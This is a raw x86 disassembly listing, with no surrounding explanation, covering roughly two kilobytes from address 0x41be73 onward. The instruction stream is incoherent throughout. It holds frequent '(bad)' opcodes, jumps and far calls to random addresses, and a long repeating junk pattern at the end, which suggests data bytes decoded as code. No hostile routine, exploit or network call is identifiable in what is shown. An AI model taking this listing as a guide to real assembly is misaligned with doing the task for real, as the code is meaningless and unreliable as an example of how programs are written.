  41be73:	inc    DWORD PTR [edi]
  41be75:	push   cs
  41be76:	cmc    
  41be77:	(bad)  
  41be78:	jge    0x41be87
  41be7a:	cmc    
  41be7b:	jmp    FWORD PTR [ebp-0xa000af3]
  41be81:	xchg   ecx,eax
  41be82:	or     BYTE PTR [eax],al
  41be84:	xchg   ebx,eax
  41be85:	or     eax,0x91e5fff5
  41be8a:	or     BYTE PTR [eax],al
  41be8c:	mov    bh,0x19
  41be8e:	cmc    
  41be8f:	jmp    ebx
  41be91:	sbb    ebp,esi
  41be93:	jmp    DWORD PTR [ebp-0x2fff76f]
  41be99:	sbb    ebp,esi
  41be9b:	push   ecx
  41be9d:	sbb    ebp,esi
  41be9f:	jmp    DWORD PTR [ebp+0x18]
  41bea2:	cmc    
  41bea3:	call   FWORD PTR [ecx+0x18]
  41bea6:	cmc    
  41bea7:	dec    DWORD PTR [ebp+edx*2+0x498bff84]
  41beae:	test   bh,bh
  41beb0:	cmp    DWORD PTR [ebx+0x218c0008],0xffffff81
  41beb7:	push   DWORD PTR [ebx+0x45]
  41beba:	cmp    edi,0xff810d6b
  41bec0:	arpl   WORD PTR [ebx-0x7f],cx
  41bec3:	call   FWORD PTR [ebx+0x31]
  41bec6:	cmp    edi,0xff80f353
	...
  41bee0:	dec    ebx
  41bee1:	jmp    0x41be63
  41bee3:	inc    DWORD PTR [ebx-0xf]
  41bee6:	cmp    bh,0x3b
  41bee9:	sbb    DWORD PTR [ecx-0x7ed4cc01],eax
  41beef:	jmp    FWORD PTR [ebx]
  41bef1:	mov    ebx,0xa18c0008
  41bef6:	cmp    edi,0x1b
  41bef9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41befa:	cmp    edi,0x13
  41befd:	mov    ebx,0x988c0008
  41bf02:	or     al,0x41
  41bf04:	jle    0x41bede
  41bf06:	stos   DWORD PTR es:[edi],eax
  41bf07:	jae    0x41bf7a
  41bf09:	in     eax,dx
  41bf0a:	mov    ds:0x8fc696b,eax
  41bf0f:	aas    
  41bf10:	mov    cs,WORD PTR [ecx]
  41bf12:	mov    al,ds:0xa3f5685e
  41bf17:	imul   esi,DWORD PTR [ecx-0x45],0x8
  41bf1b:	and    DWORD PTR [edx+edi*8+0x103f6ca4],ecx
  41bf22:	rcr    DWORD PTR [esi+0x32],0x17
  41bf26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf27:	bound  ecx,QWORD PTR [edx+edx*4+0x143e5507]
  41bf2e:	mov    ebp,0xa5145262
  41bf33:	bound  ecx,QWORD PTR [esp+edx*4+0x2128010c]
  41bf3a:	pop    ebx
  41bf3b:	mov    dl,0x27
  41bf3d:	das    
  41bf3e:	dec    ebp
  41bf3f:	ret    
  41bf40:	mov    esp,DWORD PTR [esi+ecx*4+0x3]
	...
  41bf57:	add    cl,cl
  41bf59:	xor    BYTE PTR [esi-0x5e],bl
  41bf5c:	fidiv  DWORD PTR [eax]
  41bf5e:	and    ebp,DWORD PTR [ebp+0x3df2fec]
  41bf64:	and    DWORD PTR [esi+0x36f0b02e],edx
  41bf6a:	add    BYTE PTR [eax-0x52fccd42],dh
  41bf70:	in     al,dx
  41bf71:	das    
  41bf72:	fild   WORD PTR [ebx]
  41bf74:	inc    eax
  41bf75:	xchg   esi,eax
  41bf76:	adc    ebp,DWORD PTR [ebp-0x39e4ca54]
  41bf7c:	mov    ebp,0x3c040c39
  41bf81:	xchg   esi,eax
  41bf82:	sub    ebp,DWORD PTR [ebp-0x3d0cca54]
  41bf88:	mov    bh,0x30
  41bf8a:	fisub  WORD PTR [eax+0x107a41b]
  41bf90:	mov    al,ds:0x6cb1d327
  41bf95:	and    al,0xd8
  41bf97:	ret    0xa403
  41bf9a:	rol    DWORD PTR [eax],1
  41bf9c:	push   0x6cb1bb27
  41bfa1:	xor    eax,0xa3ebc2b3
  41bfa6:	fld    QWORD PTR [edx]
  41bfa8:	dec    ecx
  41bfa9:	cmp    DWORD PTR [ebx-0x73cf8d3b],edx
  41bfaf:	ret    0x285f
  41bfb2:	xchg   ecx,eax
  41bfb3:	stos   BYTE PTR es:[edi],al
  41bfb4:	sub    eax,0x3ca69b29
  41bfb9:	push   ebp
  41bfba:	fild   WORD PTR [ebx]
	...
  41bfd0:	pop    ss
  41bfd1:	xchg   ebp,eax
  41bfd2:	lods   al,BYTE PTR ds:[esi]
  41bfd3:	mov    ebx,0x87083523
  41bfd8:	repz push esi
  41bfda:	data16 ja 0x41bfd3
  41bfdd:	and    eax,0x36eb5765
  41bfe2:	push   bp
  41bfe4:	mov    ebp,0x3a407a27
  41bfe9:	cmp    BYTE PTR [ecx+0x28],bh
  41bfec:	mov    BYTE PTR [eax+0x27332e07],al
  41bff2:	dec    esi
  41bff3:	push   eax
  41bff4:	cmp    al,0x36
  41bff6:	pop    ecx
  41bff7:	inc    eax
  41bff8:	es ss or bh,ch
  41bffc:	(bad)  
  41bffd:	push   ebp
  41bffe:	jp     0x41c00c
  41c000:	das    
  41c001:	daa    
  41c002:	imul   esp,DWORD PTR [edi],0x27
  41c005:	das    
  41c006:	imul   esp,DWORD PTR [edi+ebp*8],0x32
  41c00a:	js     0x41c00c
  41c00c:	repnz aaa 
  41c00e:	inc    edi
  41c00f:	jmp    0x2c4c54a3
  41c014:	out    dx,eax
  41c015:	xor    bl,BYTE PTR [esi+0x0]
  41c018:	repz daa 
  41c01a:	inc    ebp
  41c01b:	pop    es
  41c01c:	dec    edx
  41c01d:	cmp    ah,BYTE PTR [esp+ecx*8-0x71]
  41c021:	lds    ecx,FWORD PTR [ecx]
  41c023:	mov    ah,0xe1
  41c025:	sub    eax,0x39e1d967
  41c02a:	imul   edx,esi,0xffffffd0
  41c02d:	cmp    BYTE PTR [esi-0x30],cl
  41c030:	sub    esi,DWORD PTR [esi]
  41c032:	or     BYTE PTR [ebx+0x0],dl
	...
  41c045:	add    BYTE PTR [eax],al
  41c047:	add    BYTE PTR [esi+0x33c86550],cl
  41c04d:	dec    edi
  41c04e:	pop    edi
  41c04f:	retf   
  41c050:	sbb    eax,0xcea07a42
  41c055:	mov    ds:0x598ebaf4,al
  41c05a:	imul   ebx,DWORD PTR [ebp-0x759adb21],0xffffffce
  41c061:	ss ins BYTE PTR es:[edi],dx
  41c063:	add    BYTE PTR [edi],dh
  41c065:	cli    
  41c066:	ja     0x41c0db
  41c068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c069:	xchg   esi,eax
  41c06a:	mov    WORD PTR [ecx],es
  41c06c:	cli    
  41c06d:	stc    
  41c06e:	js     0x41c0c4
  41c070:	or     dl,dh
  41c072:	fs push eax
  41c074:	inc    esp
  41c075:	in     al,0x6c
  41c077:	inc    ecx
  41c078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c079:	xchg   esi,eax
  41c07a:	cmp    DWORD PTR [eax],eax
  41c07c:	mov    dh,0xea
  41c07e:	imul   esp,DWORD PTR [ecx-0x27],0xb76948f3
  41c085:	repz addr16 je 0x41c04b
  41c089:	jmp    0x6d:0x9675417d
  41c090:	test   eax,0x796560f3
  41c095:	repz dec edx
  41c097:	imul   eax,DWORD PTR [ecx+0x350035f3],0x99654b99
  41c0a1:	fnstcw WORD PTR [ecx+0x72]
  41c0a4:	aaa    
  41c0a5:	cmc    
  41c0a6:	bound  esi,QWORD PTR [ebp+edx*4-0x16]
  41c0aa:	arpl   WORD PTR [ebx+0x0],sp
	...
  41c0bd:	add    BYTE PTR [eax],al
  41c0bf:	add    BYTE PTR [eax-0x5aff8817],bl
  41c0c5:	call   0x6847:0xf549695b
  41c0cc:	inc    esp
  41c0cd:	call   0xe572302a
  41c0d2:	pusha  
  41c0d3:	je     0x41c0a1
  41c0d5:	xlat   BYTE PTR ds:[ebx]
  41c0d6:	jge    0x41c14c
  41c0d8:	enter  0x2095,0x1
  41c0dc:	sub    dh,ch
  41c0de:	js     0x41c12c
  41c0e0:	aam    0xea
  41c0e2:	js     0x41c129
  41c0e4:	daa    
  41c0e5:	call   0x9627334d
  41c0ea:	sbb    DWORD PTR [ebx],eax
  41c0ec:	add    ebx,ebp
  41c0ee:	js     0x41c162
  41c0f0:	mov    WORD PTR [esi],cs
  41c0f2:	mov    al,ds:0x8ab4d6f
  41c0f7:	push   edi
  41c0f8:	mov    esi,gs
  41c0fa:	mov    edx,0xa8272d62
  41c0ff:	push   ebx
  41c100:	cmp    ebx,DWORD PTR [edx]
  41c102:	lods   eax,DWORD PTR ds:[esi]
  41c103:	sub    DWORD PTR [bx],ebx
  41c106:	mov    ecx,0xa25e5e30
  41c10b:	pop    esi
  41c10c:	sbb    al,0x3e
  41c10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c10f:	ins    BYTE PTR es:[edi],dx
  41c110:	add    BYTE PTR [eax+ecx*1-0x41a471dd],ch
  41c117:	ins    BYTE PTR es:[edi],dx
  41c118:	out    dx,eax
  41c119:	push   eax
  41c11a:	mov    ebp,0xc69dbf70
  41c11f:	data16 ficomp WORD PTR [esi-0x48]
  41c123:	inc    DWORD PTR [eax]
	...
  41c135:	add    BYTE PTR [eax],al
  41c137:	add    BYTE PTR [ebx-0x3d],ah
  41c13a:	or     cl,BYTE PTR [ebp-0x24]
  41c13d:	nop
  41c13e:	mov    ds:0xad92de4f,al
  41c143:	bound  edi,QWORD PTR [edi-0x71daf382]
  41c149:	pop    ebx
  41c14a:	mov    esi,0xbd90af6c
  41c14f:	jo     0x41c1d0
  41c151:	fnstsw WORD PTR [esi+0x89fa462]
  41c157:	scas   eax,DWORD PTR es:[edi]
  41c158:	mov    WORD PTR [ecx-0x5d],?
  41c15b:	ins    DWORD PTR es:[edi],dx
  41c15c:	mov    al,0xf1
  41c15e:	mov    ds:0xc6c79f71,eax
  41c163:	data16 js 0x41c136
  41c166:	retf   
  41c167:	inc    DWORD PTR [ebx]
  41c169:	stos   BYTE PTR es:[edi],al
  41c16a:	or     eax,0xbadf7f6c
  41c16f:	pusha  
  41c170:	popa   
  41c171:	(bad)  [ebx+0x9258c3e]
  41c177:	inc    esi
  41c178:	jne    0x41c15b
  41c17a:	xchg   esp,eax
  41c17b:	dec    ebp
  41c17c:	jno    0x41c112
  41c17e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c17f:	scas   eax,DWORD PTR es:[edi]
  41c180:	dec    ecx
  41c181:	sub    eax,DWORD PTR [ebx+0x4c948aa0]
  41c187:	add    ecx,DWORD PTR [edx+0x2b]
  41c18a:	jne    0x41c12b
  41c18c:	dec    esp
  41c18d:	xor    BYTE PTR [esi-0x446bd14a],bl
  41c193:	add    al,0x51
  41c195:	aaa    
  41c196:	jae    0x41c160
  41c198:	xor    BYTE PTR [eax],bh
  41c19a:	jl     0x41c143
	...
  41c1b0:	cs dec esp
  41c1b2:	inc    eax
  41c1b3:	stos   BYTE PTR es:[edi],al
  41c1b4:	das    
  41c1b5:	xor    BYTE PTR [ebx+eax*8-0x75],cl
  41c1b9:	mov    al,ds:0x39c90374
  41c1be:	pop    ebx
  41c1bf:	shr    dh,cl
  41c1c1:	and    dh,BYTE PTR [edx]
  41c1c3:	stos   DWORD PTR es:[edi],eax
  41c1c4:	loopne 0x41c1f4
  41c1c6:	sub    al,0xbc
  41c1c8:	stos   BYTE PTR es:[edi],al
  41c1c9:	xchg   esp,eax
  41c1ca:	or     DWORD PTR [ebx],eax
  41c1cc:	leave  
  41c1cd:	cmp    DWORD PTR [ebx],edi
  41c1cf:	enter  0x33e8,0x0
  41c1d3:	test   al,0xee
  41c1d5:	dec    ebp
  41c1d6:	add    eax,0xdf55b8a2
  41c1db:	add    edi,DWORD PTR [eax-0x4060d16b]
  41c1e1:	inc    ebx
  41c1e2:	or     BYTE PTR [ebp-0x34fbc641],dh
  41c1e8:	mov    ecx,0xec040e36
  41c1ed:	xchg   ebp,eax
  41c1ee:	cs lahf 
  41c1f0:	lahf   
  41c1f1:	inc    edi
  41c1f2:	fsubr  DWORD PTR [ecx-0x4b21d051]
  41c1f8:	dec    edi
  41c1f9:	sub    eax,0x286c9ed1
  41c1fe:	mov    dh,0xb5
  41c200:	adc    BYTE PTR [ebp-0x21],0x3
  41c204:	inc    ecx
  41c205:	xchg   ebp,eax
  41c206:	scas   al,BYTE PTR es:[edi]
  41c207:	sahf   
  41c208:	pop    edi
  41c209:	inc    esp
  41c20a:	or     BYTE PTR [ebx-0x4a98d5ca],bh
  41c210:	cli    
  41c211:	dec    edi
  41c212:	jp     0x41c1aa
	...
  41c228:	sub    eax,0xe0846437
  41c22d:	and    edi,DWORD PTR [edx-0x80]
  41c230:	cmc    
  41c231:	cmp    BYTE PTR [edi-0x17],al
  41c234:	(bad)  
  41c235:	sbb    cl,BYTE PTR [edx]
  41c237:	call   0x25e1:0x74492412
  41c23e:	imul   eax,DWORD PTR [edi+0x7b5f53f3],0xfffffffa
  41c245:	xor    al,0x7c
  41c247:	push   esi
  41c248:	fisub  DWORD PTR [esi]
  41c24a:	inc    edi
  41c24b:	jmp    0x2e4912df
  41c250:	and    esp,DWORD PTR [ebx]
  41c252:	pop    eax
  41c253:	pop    ebx
  41c254:	daa    
  41c255:	sub    DWORD PTR [edi+0x3d],esp
  41c258:	adc    ecx,DWORD PTR [edi+0x7a]
  41c25b:	dec    esi
  41c25c:	cs ss fs dec esp
  41c260:	cmp    DWORD PTR [edx],esi
  41c262:	imul   esi,DWORD PTR ds:0x37663027,0x1a6b2a2f
  41c26c:	dec    edi
  41c26d:	lahf   
  41c26e:	hlt    
  41c26f:	and    BYTE PTR [edi+0x60156b59],cl
  41c275:	and    eax,0x22eeff5f
  41c27a:	imul   ebx,DWORD PTR [ecx],0xffffffe2
  41c27d:	das    
  41c27e:	outs   dx,BYTE PTR ds:[esi]
  41c27f:	add    ah,dh
  41c281:	xor    DWORD PTR [edi],edi
  41c283:	(bad)  
  41c284:	jmp    0x41c2e3
  41c286:	or     BYTE PTR [edi-0x71],ah
  41c289:	pop    ecx
  41c28a:	imul   edx,ebp,0x0
	...
  41c29d:	add    BYTE PTR [eax],al
  41c29f:	add    al,dl
  41c2a1:	and    DWORD PTR [edx-0x25],edi
  41c2a4:	and    dh,BYTE PTR [ecx]
  41c2a6:	jl     0x41c24d
  41c2a8:	es and eax,0xeec6006b
  41c2ae:	arpl   WORD PTR [edx-0x34],si
  41c2b1:	shl    esp,1
  41c2b3:	(bad)  
  41c2b4:	mov    ebx,0x21736497
  41c2b9:	jmp    0xc43d281e
  41c2be:	hlt    
  41c2bf:	(bad)  
  41c2c0:	mov    eax,0x9754198
  41c2c5:	out    dx,eax
  41c2c6:	ins    DWORD PTR es:[edi],dx
  41c2c7:	inc    edx
  41c2c8:	sbb    al,0xef
  41c2ca:	imul   edx,DWORD PTR [edx+ebx*1-0x3c],0xd810646d
  41c2d2:	ins    BYTE PTR es:[edi],dx
  41c2d3:	popa   
  41c2d4:	daa    
  41c2d5:	xchg   ebx,eax
  41c2d6:	add    DWORD PTR [ecx],0x5478fdf2
  41c2dc:	cmp    al,0xf3
  41c2de:	pop    edi
  41c2df:	inc    ebx
  41c2e0:	(bad)  
  41c2e2:	bound  esi,QWORD PTR [ebp+esi*2-0x6e]
  41c2e6:	scas   eax,DWORD PTR es:[edi]
  41c2e7:	add    dh,BYTE PTR [esi-0x4a9a9614]
  41c2ed:	cwde   
  41c2ee:	cmp    al,BYTE PTR [ecx]
  41c2f0:	mov    dl,0xf3
  41c2f2:	js     0x41c341
  41c2f4:	retf   0x79f4
  41c2f7:	ins    BYTE PTR es:[edi],dx
  41c2f8:	rcr    dh,1
  41c2fa:	ins    DWORD PTR es:[edi],dx
  41c2fb:	ins    BYTE PTR es:[edi],dx
  41c2fc:	adc    dh,0x55
  41c2ff:	ins    DWORD PTR es:[edi],dx
  41c300:	nop
  41c301:	xlat   BYTE PTR ds:[ebx]
  41c302:	hlt    
  41c303:	inc    DWORD PTR [eax]
	...
  41c315:	add    BYTE PTR [eax],al
  41c317:	add    BYTE PTR [edx],dl
  41c319:	cwde   
  41c31a:	inc    esp
  41c31b:	inc    ebx
  41c31c:	cwde   
  41c31d:	mul    DWORD PTR [ebx+edx*2+0x31]
  41c321:	in     al,0x6d
  41c323:	outs   dx,BYTE PTR ds:[esi]
  41c324:	xchg   edx,eax
  41c325:	xlat   BYTE PTR ds:[ebx]
  41c326:	hlt    
  41c327:	(bad)  
  41c328:	mov    esi,0x8c784998
  41c32d:	in     al,0x44
  41c32f:	jb     0x41c36b
  41c331:	repz imul esi,DWORD PTR [ebx-0x1a],0x8c02a591
  41c339:	fisub  DWORD PTR [edi-0x5f229e8d]
  41c33f:	pop    esi
  41c340:	(bad)  
  41c341:	iret   
  41c342:	lods   al,BYTE PTR ds:[esi]
  41c343:	bound  esi,QWORD PTR [eax-0x8]
  41c346:	mov    al,0x60
  41c348:	imul   ebx,ebx,0xdd6b66a4
  41c34e:	mov    dl,0x66
  41c350:	pusha  
  41c351:	jmp    DWORD PTR [edi-0x57fd738f]
  41c357:	jno    0x41c38b
  41c359:	adc    BYTE PTR [ebp-0x6b2281d0],ch
  41c35f:	imul   esp,DWORD PTR [eax],0xffffffab
  41c362:	or     BYTE PTR [ecx+0x62b6ea8c],cl
  41c368:	sub    eax,0x2050a81f
  41c36d:	sbb    DWORD PTR [eax-0x5199dea2],ebp
  41c373:	inc    edi
  41c374:	ror    DWORD PTR [edi-0x53],cl
  41c377:	popa   
  41c378:	in     eax,dx
  41c379:	push   edi
  41c37a:	or     al,0x95
	...
  41c390:	mov    WORD PTR [esi-0x59],?
  41c393:	jae    0x41c359
  41c395:	outs   dx,BYTE PTR ds:[esi]
  41c396:	mov    al,ds:0xa04cee6c
  41c39b:	inc    ebp
  41c39c:	ficom  WORD PTR [esi-0x61]
  41c39f:	push   eax
  41c3a0:	loopne 0x41c3fb
  41c3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3a3:	pop    esi
  41c3a4:	loope  0x41c351
  41c3a6:	or     BYTE PTR [esi],cl
  41c3a8:	mov    WORD PTR [edx-0x53],gs
  41c3ab:	inc    eax
  41c3ac:	mov    esi,0xb173ab90
  41c3b1:	jbe    0x41c36a
  41c3b3:	data16 test al,0xab
  41c3b6:	or     BYTE PTR [eax-0x74],ah
  41c3b9:	push   0xffffffad
  41c3bb:	push   ebx
  41c3bc:	lods   eax,DWORD PTR ds:[esi]
  41c3bd:	call   0x71b2:0xa0b14aa1
  41c3c4:	test   eax,0x9903c494
  41c3c9:	xchg   esp,eax
  41c3ca:	mov    ds:0xc4224ca6,al
  41c3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3d0:	jg     0x41c409
  41c3d2:	test   al,0xa5
  41c3d4:	jl     0x41c3fe
  41c3d6:	shl    BYTE PTR [ebp+0x3df376c],0xdd
  41c3dd:	xchg   ebx,eax
  41c3de:	scas   al,BYTE PTR es:[edi]
  41c3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3e0:	outs   dx,BYTE PTR ds:[esi]
  41c3e1:	dec    ebx
  41c3e2:	mov    ch,0xac
  41c3e4:	pop    edi
  41c3e5:	sub    eax,DWORD PTR [eax-0x73e5cd59]
  41c3eb:	add    esi,DWORD PTR [ecx]
  41c3ed:	xor    BYTE PTR [edx+esi*8-0x58749183],al
	...
  41c408:	daa    
  41c409:	xchg   esp,eax
  41c40a:	mov    WORD PTR [ecx],es
  41c40c:	and    DWORD PTR [ecx],esp
  41c40e:	outs   dx,DWORD PTR ds:[esi]
  41c40f:	mov    cl,0x2a
  41c411:	cs jae 0x41c3b1
  41c414:	pop    edx
  41c415:	xchg   esp,eax
  41c416:	jl     0x41c3ca
  41c418:	and    dl,BYTE PTR cs:[edx]
  41c41b:	repnz mov ecx,0x83a84330
  41c421:	pushf  
  41c422:	scas   al,BYTE PTR es:[edi]
  41c423:	add    ebx,esi
  41c425:	xor    DWORD PTR [esi-0x3b],ecx
  41c428:	jecxz  0x41c45b
  41c42a:	pop    ebp
  41c42b:	leave  
  41c42c:	out    dx,al
  41c42d:	sbb    eax,0x94a2bc2c
  41c432:	cdq    
  41c433:	add    edi,DWORD PTR [esi-0x212cb1cf]
  41c439:	xor    DWORD PTR [ecx],edx
  41c43b:	mov    ebx,0xaf0335e1
  41c440:	scas   al,BYTE PTR es:[edi]
  41c441:	push   ecx
  41c442:	pop    ss
  41c443:	ret    
  41c444:	cmp    ebx,DWORD PTR [ebp+ebx*2+0x631de03]
  41c44b:	shl    DWORD PTR [edi-0x2b610dd5],0x31
  41c452:	or     al,dh
  41c454:	(bad)
  41c458:	repz xor BYTE PTR [ebp-0x27],al
  41c45c:	sub    ch,BYTE PTR [edx]
  41c45e:	inc    ecx
  41c45f:	les    eax,FWORD PTR [esi+0x5b]
  41c462:	or     BYTE PTR ds:0xc66b468f,ch
  41c468:	xor    ch,BYTE PTR [edx]
  41c46a:	jnp    0x41c440
	...
  41c480:	aam    0x36
  41c482:	outs   dx,DWORD PTR ds:[esi]
  41c483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c484:	daa    
  41c485:	pop    ebx
  41c486:	or     BYTE PTR [ebx-0x71],dh
  41c489:	inc    esi
  41c48a:	imul   eax,esi,0xffffffcc
  41c48d:	and    eax,0x36fb886b
  41c492:	inc    ecx
  41c493:	test   BYTE PTR [esi],al
  41c495:	pop    ebx
  41c496:	or     BYTE PTR [esi],cl
  41c498:	pop    DWORD PTR [esi+0x6b]
  41c49b:	xchg   ah,bl
  41c49d:	ss jl  0x41c43f
  41c4a0:	out    dx,al
  41c4a1:	das    
  41c4a2:	jnp    0x41c428
  41c4a4:	loop   0x41c4c9
  41c4a6:	inc    edi
  41c4a7:	jmp    0xa049343b
  41c4ac:	fadd   QWORD PTR [edi+0x6b]
  41c4af:	popa   
  41c4b0:	cmp    al,0x46
  41c4b2:	push   ax
  41c4b4:	sub    eax,0x904c6c28
  41c4b9:	retf   0x3b06
  41c4bc:	adc    esi,DWORD PTR [eax]
  41c4be:	inc    ebp
  41c4bf:	cmp    DWORD PTR [ebx],ecx
  41c4c1:	sub    DWORD PTR [ecx+0x34],ecx
  41c4c4:	push   ds
  41c4c5:	and    eax,0x461c476b
  41c4ca:	jns    0x41c510
  41c4cc:	push   ds
  41c4cd:	fwait
  41c4ce:	hlt    
  41c4cf:	scas   al,BYTE PTR es:[edi]
  41c4d0:	mov    es,WORD PTR [esi+0x6b]
  41c4d3:	push   es
  41c4d4:	add    ebp,DWORD PTR [ecx]
  41c4d6:	jnp    0x41c4dc
  41c4d8:	dec    edx
  41c4d9:	cmp    ah,BYTE PTR [esp+edx*1+0x13]
  41c4dd:	pop    edx
  41c4de:	or     BYTE PTR [eax],al
  41c4e0:	cs xchg esi,eax
  41c4e2:	dec    ebx
  41c4e3:	add    BYTE PTR gs:[eax],al
	...
  41c4f6:	add    BYTE PTR [eax],al
  41c4f8:	sbb    edx,ecx
  41c4fa:	ja     0x41c561
  41c4fc:	pop    ss
  41c4fd:	rcl    DWORD PTR [ebp+0x6d],1
  41c500:	mov    bh,dl
  41c502:	hlt    
  41c503:	call   esp
  41c505:	cli    
  41c506:	jp     0x41c569
  41c508:	in     eax,0xed
  41c50a:	aaa    
  41c50b:	xor    dl,BYTE PTR [ebx-0x1a939f0c]
  41c511:	xchg   esi,eax
  41c512:	fld    QWORD PTR [eax]
  41c514:	push   es
  41c515:	out    dx,eax
  41c516:	imul   ebp,DWORD PTR [ecx+edx*8-0x27],0xe9c6657c
  41c51e:	js     0x41c585
  41c520:	and    al,0x97
  41c522:	ja     0x41c58c
  41c524:	sbb    bl,dh
  41c526:	pusha  
  41c527:	xor    esp,edi
  41c529:	mov    al,0x68
  41c52b:	ins    BYTE PTR es:[edi],dx
  41c52c:	adc    DWORD PTR [edi-0xf13ff83],edx
  41c532:	js     0x41c599
  41c534:	daa    
  41c535:	icebp  
  41c536:	imul   esi,DWORD PTR [esi+esi*8-0x1c],0xca0e6355
  41c53e:	jbe    0x41c5ac
  41c540:	in     al,0x96
  41c542:	outs   dx,DWORD PTR ds:[esi]
  41c543:	add    BYTE PTR [esi+esi*8-0x9189a88],bh
  41c54a:	imul   esi,DWORD PTR [esi+eiz*4-0x1e],0xebd96169
  41c552:	pop    ecx
  41c553:	jb     0x41c516
  41c555:	iret   
  41c556:	hlt    
  41c557:	call   FWORD PTR [edx+0x6962f7]
	...
  41c56d:	add    BYTE PTR [eax],al
  41c56f:	add    bl,dl
  41c571:	jmp    0x41c5eb
  41c573:	cs leave 
  41c575:	hlt    
  41c576:	pusha  
  41c577:	add    BYTE PTR [eax-0x6f],al
  41c57a:	push   edi
  41c57b:	je     0x41c524
  41c57d:	sar    DWORD PTR [eax+0x72],0x8c
  41c581:	je     0x41c54e
  41c583:	push   DWORD PTR [ebx]
  41c585:	lods   al,BYTE PTR ds:[esi]
  41c586:	or     edx,DWORD PTR [ecx-0x60]
  41c589:	popf   
  41c58a:	fiadd  DWORD PTR [eax-0x4c]
  41c58d:	popf   
  41c58e:	mov    bl,0x3e
  41c590:	mov    WORD PTR [edi-0x6267aef5],?
  41c596:	fsubr  QWORD PTR [ebp+edx*2-0x3f]
  41c59a:	mov    esp,0xba78c3e
  41c59f:	push   ecx
  41c5a0:	cmp    BYTE PTR [ebp-0x13818c23],0x8
  41c5a7:	jmp    0xc84f:0x71bcfe8c
  41c5ae:	mov    eax,0x8ec454d
  41c5b3:	push   cs
  41c5b4:	(bad)  
  41c5b5:	(bad)  
  41c5b6:	mov    esp,0xbaf75f71
  41c5bb:	inc    esi
  41c5bc:	pop    ebx
  41c5bd:	stos   DWORD PTR es:[edi],eax
  41c5be:	or     BYTE PTR [ecx+0x24],dh
  41c5c1:	lss    ebx,FWORD PTR [esi+0x3c]
  41c5c5:	adc    al,0xe7
  41c5c7:	arpl   WORD PTR [eax],di
  41c5c9:	dec    DWORD PTR [eax]
  41c5cb:	mov    WORD PTR ss:[edi+eiz*4],es
  41c5cf:	bound  esp,QWORD PTR [eax]
  41c5d1:	add    ch,BYTE PTR [ebx+eiz*2+0x0]
	...
  41c5e8:	sub    BYTE PTR ds:0x4a8c2a09,bl
  41c5ee:	lahf   
  41c5ef:	jae    0x41c5e5
  41c5f1:	dec    edx
  41c5f2:	mov    ebp,0xaa44ee73
  41c5f7:	pop    esi
  41c5f8:	loope  0x41c64a
  41c5fa:	or     al,0x47
  41c5fc:	mov    WORD PTR [esi-0x57],ds
  41c5ff:	pusha  
  41c600:	not    DWORD PTR [eax-0x50]
  41c603:	call   FWORD PTR [ebx-0x76]
  41c606:	or     al,0x61
  41c608:	jecxz  0x41c663
  41c60a:	stos   BYTE PTR es:[edi],al
  41c60b:	bound  ebp,QWORD PTR [edi+0x6a041394]
  41c611:	xchg   esp,eax
  41c612:	add    ah,BYTE PTR [eax-0x48fbda58]
  41c618:	mov    al,ds:0x9fa90a35
  41c61d:	xchg   esp,eax
  41c61e:	and    eax,DWORD PTR [ebx*4+0x1ba8052f]
  41c625:	cdq    
  41c626:	and    DWORD PTR [ebx*4+0x6ca8f32f],eax
  41c62d:	and    bh,bl
  41c62f:	add    eax,edx
  41c631:	xchg   esp,eax
  41c632:	shr    DWORD PTR [eax+0x3df226c],1
  41c638:	dec    ecx
  41c639:	xchg   esp,eax
  41c63a:	shr    BYTE PTR [eax-0x5921daa1],cl
  41c640:	je     0x41c66b
  41c642:	scas   eax,DWORD PTR es:[edi]
  41c643:	mov    bh,0xdb
  41c645:	cwde   
  41c646:	inc    DWORD PTR [ebx]
  41c648:	cmp    DWORD PTR [ebp-0x60],eax
  41c64b:	(bad)  
	...
  41c660:	aas    
  41c661:	xor    edx,DWORD PTR [ecx-0x20dbc149]
  41c667:	add    eax,DWORD PTR [ecx+0x25]
  41c66a:	mov    fs,WORD PTR [esi-0x1e2e9adc]
  41c670:	das    
  41c671:	sub    BYTE PTR [ebx-0x5c6ba8fd],bl
  41c677:	mov    ds:0xb694303a,al
  41c67c:	cs es (bad) 
  41c67f:	mov    ch,0xf8
  41c681:	cs pop eax
  41c683:	mov    al,ds:0x3df55ee
  41c688:	fist   DWORD PTR [esp+esi*1+0x4027e7a2]
  41c68f:	test   al,0xbe
  41c691:	and    eax,DWORD PTR [esi+esi*4-0x2d]
  41c695:	and    al,BYTE PTR [esi-0x56]
  41c698:	repnz sub BYTE PTR [eax],cl
  41c69b:	dec    esp
  41c69c:	mov    BYTE PTR [ebx],ah
  41c69e:	jns    0x41c6e4
  41c6a0:	add    dh,BYTE PTR [ebx]
  41c6a2:	popw   ds
  41c6a4:	cs xor al,0x64
  41c6a7:	or     eax,0xe9089490
  41c6ac:	(bad)  
  41c6ad:	xchg   esp,eax
  41c6ae:	or     cl,ch
  41c6b0:	(bad)  
  41c6b1:	xchg   esp,eax
  41c6b2:	or     cl,ch
  41c6b4:	(bad)  
  41c6b5:	xchg   esp,eax
  41c6b6:	or     cl,ch
  41c6b8:	(bad)  
  41c6b9:	xchg   esp,eax
  41c6ba:	or     cl,ch
  41c6bc:	(bad)  
  41c6bd:	xchg   esp,eax
  41c6be:	or     cl,ch
  41c6c0:	(bad)  
  41c6c1:	xchg   esp,eax
  41c6c2:	or     cl,ch
	...
  41c6d8:	(bad)  
  41c6d9:	xchg   esp,eax
  41c6da:	or     cl,ch
  41c6dc:	(bad)  
  41c6dd:	xchg   esp,eax
  41c6de:	or     cl,ch
  41c6e0:	(bad)  
  41c6e1:	xchg   esp,eax
  41c6e2:	or     cl,ch
  41c6e4:	(bad)  
  41c6e5:	xchg   esp,eax
  41c6e6:	or     cl,ch
  41c6e8:	(bad)  
  41c6e9:	xchg   esp,eax
  41c6ea:	or     cl,ch
  41c6ec:	(bad)  
